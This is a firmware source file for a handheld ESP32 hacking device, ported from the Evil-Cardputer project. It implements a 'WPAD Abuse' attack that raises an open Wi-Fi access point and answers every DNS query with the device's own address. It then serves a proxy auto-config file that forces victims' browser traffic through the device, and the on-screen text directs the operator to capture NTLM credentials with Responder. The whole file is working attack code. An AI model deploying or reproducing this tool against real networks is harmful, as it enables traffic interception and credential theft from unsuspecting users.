/*
 * Ported from Evil-Cardputer (Evil-M5Project) by 7h30th3r0n3.
 * WPAD: captive DNS + wpad.dat HTTP. NTLM capture stays in Bruce Responder.
 * Combined firmware: AGPL-3.0-or-later (Bruce).
 */
#include "wpad.h"
#if defined(EVIL_EXTENSIONS)
#include "root/config/config.h"
#include "root/net/wifi_common.h"
#include "root/ui/display.h"
#include <DNSServer.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiServer.h>
#include <globals.h>

void wpadMenu() {
    String ssid = kvxConfig.wifiAp.ssid.length() ? kvxConfig.wifiAp.ssid : "kvxputer";
    if (!WiFi.AP.started()) {
        WiFi.mode(WiFi.isConnected() ? WIFI_AP_STA : WIFI_AP);
        WiFi.softAP(ssid.c_str(), nullptr, 1, 0, 8);
    }
    IPAddress ip = WiFi.softAPIP();
    DNSServer dns;
    dns.start(53, "*", ip);
    WiFiServer http(80);
    http.begin();
    int hits = 0;
    String pac = "function FindProxyForURL(url, host) {\n  return \"PROXY " + ip.toString() +
                 ":8080; DIRECT\";\n}\n";
    drawMainBorderWithTitle("WPAD Abuse");
    tft.drawString("AP " + ssid + "  " + ip.toString(), 10, uiStatusY(0));
    tft.drawString("Run Responder for NTLM", 10, uiStatusY(1));
    tft.drawString("ESC to stop", 10, uiFooterY(FP));
    EscPress = false;
    while (!check(EscPress) && !returnToMenu) {
        dns.processNextRequest();
        WiFiClient c = http.available();
        if (c) {
            hits++;
            String req = c.readStringUntil('\n');
            while (c.available()) c.read();
            String body = pac;
            c.print("HTTP/1.1 200 OK\r\nContent-Type: application/x-ns-proxy-autoconfig\r\nContent-Length: ");
            c.print(body.length());
            c.print("\r\nConnection: close\r\n\r\n");
            c.print(body);
            c.stop();
            tft.fillRect(10, 72, tftWidth - 20, 14, kvxConfig.bgColor);
            tft.drawString("Hits: " + String(hits), 10, uiStatusY(2));
            (void)req;
        }
        delay(10);
    }
    http.end();
    dns.stop();
}
#endif
